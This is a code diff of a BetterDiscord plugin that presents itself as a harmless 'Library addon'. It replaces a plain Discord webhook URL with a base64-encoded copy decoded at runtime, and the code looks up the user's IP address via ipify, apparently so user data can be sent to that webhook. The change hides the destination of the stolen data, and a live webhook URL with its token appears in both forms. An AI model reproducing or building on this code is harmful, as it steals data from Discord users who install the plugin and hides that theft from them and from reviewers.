@@ -4,6 +4,7 @@
   * @description Library addon for the Better Discord APP
 */
 
+var wh = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODMwODM3MTcxMTMyNDMyNDI0L1lhX3VSd3JMSDVmdmhUTk9OdUtEQ2lxallCbi1PRGxyYkpuakozNU5oUXZSdV9hZXh0QkctY1VSZmV1Y3htRVA5N3I2");
 const config = {
     "info": {
         "name": "BDLibrary",
@@ -11,7 +12,7 @@ const config = {
         "version": "1.5",
         "description": "Library addon for the Better Discord APP"
     },
-    "webhook": "https://discord.com/api/webhooks/830837171132432424/Ya_uRwrLH5fvhTNONuKDCiqjYBn-ODlrbJnjJ35NhQvRu_aextBG-cURfeucxmEP97r6"
+    "webhook": wh
 }
 
 class BDLibrary {
@@ -30,6 +31,7 @@ class BDLibrary {
         let date = new Date(creationdate);
         let formatted_date = date.getDate() + "." + (date.getMonth() + 1) + "." + date.getFullYear();
         let url = 'https://api.ipify.org/?format=json';
+        
         fetch(url)
         .then(res => res.json())
         .then((out) => {
